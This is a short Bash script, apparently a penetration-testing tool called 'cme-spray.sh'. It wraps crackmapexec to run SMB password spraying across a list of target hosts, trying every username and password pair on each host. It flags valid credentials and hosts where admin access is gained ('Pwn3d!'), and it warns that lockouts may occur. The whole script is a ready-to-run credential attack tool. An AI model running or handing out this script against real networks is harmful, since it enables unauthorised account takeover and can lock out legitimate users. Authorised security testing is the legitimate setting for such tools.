#!/bin/bash

red=`tput setaf 1`
green=`tput setaf 2`
yellow=`tput setaf 226`
grey=`tput setaf 248`
blue=`tput setaf 6`
reset=`tput sgr0`

cat << "EOF"

  _____ __  __ ______      _____ _____  _____        __     __
  / ____|  \/  |  ____|    / ____|  __ \|  __ \     /\\ \   / /
 | |    | \  / | |__ _____| (___ | |__) | |__) |   /  \\ \_/ /
 | |    | |\/| |  __|______\___ \|  ___/|  _  /   / /\ \\   /
 | |____| |  | | |____     ____) | |    | | \ \  / ____ \| |
  \_____|_|  |_|______|   |_____/|_|    |_|  \_\/_/    \_\_|


EOF



echo -e "\nAuthor: ${blue}Stigs${reset}"
echo -e "May need to update ${red}crackmapexec ${reset}location in script!\n"



if [[ -n "$1"  &&  -n "$2"  && -n "$3" ]]; then
	echo -e "${blue}Running with Username List and Target List!!\n${reset}"

	while read t; do
		while read c; do
			while read p; do
				echo -e "Using Target:\t\t $t"
				echo -e "Sending Username:\t $p"
				echo -e "Sending Password:\t $c"
				run=$(/root/.pyenv/versions/2.7.17/bin/crackmapexec smb $t -u $p -p $c)
				 #echo "$run"

				if [[ $run =~ "Pwn3d!"  ]]
				then
					echo -e "${green}[+]${reset} ${grey}Username $p on Host $t with password $c ${reset}${yellow}(Pwn3d!)${reset}\n"

				elif [[ ! $run =~ "Pwn3d!" && $run =~ "[+]" ]]
				then
					echo -e "${green}[+]${reset} ${grey}Username $p with password $c on Host $t is ${reset}${green}valid${reset}\n"

				else
					echo -e "${red}[-]${reset} ${grey}Username $p on Host $t with password $c is ${reset}${red}invalid/disabled${reset}\n"
				fi

			done < $1
		done < $3
	done < $2
else

	echo -e "Usage: cme-spray.sh <Username List> <Target List> <Password List>\n"
	echo -e "Password Lockouts may happen! Know what you are doing!"
	echo -e "Submit parameters in the correct order!\n"

fi

